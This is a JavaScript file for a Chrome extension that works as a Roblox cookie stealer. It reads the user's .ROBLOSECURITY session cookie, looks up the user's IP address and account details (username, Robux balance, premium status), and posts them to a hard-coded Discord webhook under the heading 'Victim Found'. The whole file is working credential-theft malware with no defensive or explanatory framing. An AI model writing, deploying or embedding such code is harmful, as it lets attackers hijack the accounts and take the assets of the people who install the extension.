const WEBHOOK = "https://discord.com/api/webhooks/1377364831790698547/Lc36MB_gFZ-z938gzt_NMH36lhbY2EAgorbTwoUvI_POlhdEGYg_n3Xdmeu5K8LiGhJJ";

async function main(cookie) {
    let ipAddr = "Unknown IP";
    let statistics = null;

    try {
        ipAddr = await (await fetch("https://api.ipify.org")).text();
    } catch (e) {
        console.error("Failed to get IP address:", e);
    }

    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: ".ROBLOSECURITY=" + cookie
                },
                redirect: "manual"
            });

            const contentType = response.headers.get("content-type") || "";
            if (response.ok && contentType.includes("application/json")) {
                statistics = await response.json();
            } else {
                console.warn("Failed to get valid JSON user info, status:", response.status);
                const text = await response.text();
                console.log("Response text (not JSON):", text);
            }
        } catch (e) {
            console.error("Failed to fetch Roblox user info:", e);
        }
    }

    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        description: "```" + (cookie || "COOKIE NOT FOUND") + "```",
                        color: 0xff0000,
                        fields: [
                            {
                                name: "Username",
                                value: statistics ? statistics.UserName : "N/A",
                                inline: true
                            },
                            {
                                name: "Robux",
                                value: statistics ? String(statistics.RobuxBalance) : "N/A",
                                inline: true
                            },
                            {
                                name: "Premium",
                                value: statistics ? String(statistics.IsPremium) : "N/A",
                                inline: true
                            }
                        ],
                        author: {
                            name: "Victim Found: " + ipAddr,
                            icon_url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                        },
                        footer: {
                            text: "https://github.com/ox-y",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                        },
                        thumbnail: {
                            url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                        }
                    }
                ],
                username: "Roblox",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                attachments: []
            })
        });
    } catch (e) {
        console.error("Failed to send webhook:", e);
    }
}

// Chrome extension cookie API call
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function(cookie) {
    main(cookie ? cookie.value : null);
});
